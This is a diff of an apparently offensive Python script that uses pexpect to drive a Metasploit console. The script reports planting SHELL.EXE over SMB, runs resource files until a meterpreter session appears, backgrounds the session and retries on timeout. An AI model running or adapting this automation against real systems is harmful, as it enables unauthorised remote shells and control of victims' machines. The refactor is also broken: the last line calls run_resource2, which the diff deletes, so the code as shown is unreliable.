@@ -52,40 +52,42 @@ msf_script.expect('auxiliary')
 print ("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")
 print (msf_script.after)
 
-def run_resource2(msf_script):
-    msf_script.sendline('resource resource2.rc')
-    index = msf_script.expect_exact(['meterpreter', pexpect.TIMEOUT, pexpect.EOF], timeout=999)
+def run_resource(msf_script, resource_name):
+    msf_script.sendline(f'resource {resource_name}.rc')
+    index = msf_script.expect_exact(['meterpreter >', pexpect.TIMEOUT, pexpect.EOF], timeout=999)
 
     if index == 0:
-        print("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
+        print(f"{resource_name.upper()} COMPLETED - ATTACK SUCCESS")
         print(msf_script.after)
+
+        # Check if the meterpreter shell is presented
+        msf_script.expect_exact('meterpreter >', timeout=10)
+        msf_script.sendline('background')
+        msf_script.expect_exact('auxiliary')
+        print("BACKGROUND SUCCESS")
+        print(msf_script.after)
+
     elif index == 1:
         # Check if the session timed out
         timeout_occurred = msf_script.expect_exact(['This session has expired', pexpect.TIMEOUT, pexpect.EOF], timeout=10)
 
         if timeout_occurred == 0:
-            # Reattempt resource2.rc
-            print("SESSION TIMEOUT - REATTEMPTING RESOURCE2.RC")
-            msf_script.sendline('resource resource2.rc')
+            # Reattempt the resource
+            print(f"SESSION TIMEOUT - REATTEMPTING {resource_name.upper()}.RC")
+            msf_script.sendline(f'resource {resource_name}.rc')
             msf_script.expect_exact('auxiliary', timeout=999)
-            run_resource2(msf_script)  # Call the function recursively
+            run_resource(msf_script, resource_name)  # Call the function recursively
         elif timeout_occurred == 1:
             # Continue with the pexpect script
             print("EXPECTED SENDLINE NOT FOUND")
-            print("METERPRETER SHELL TO BACKGROUND")
-            msf_script.sendline('background')
-            msf_script.expect_exact('auxiliary')
-
-            print("BACKGROUND SUCCESS")
-            print(msf_script.after)
             # Your code to continue with the pexpect script goes here
         elif timeout_occurred == 2:
             # Restart from auxiliary expect if Ctrl+C doesn't cancel the current section
-            print("RESOURCE 2 RESTARTING - CANCELLED BY USER")
+            print(f"{resource_name.upper()} RESTARTING - CANCELLED BY USER")
             msf_script.sendcontrol('c')
             msf_script.expect_exact('auxiliary', timeout=999)
-            run_resource2(msf_script)  # Call the function recursively
-
+            run_resource(msf_script, resource_name)  # Call the function recursively
+            
 print("BEGINNING MULTI HANDLER")
 # Running resource2.rc
 run_resource2(msf_script)
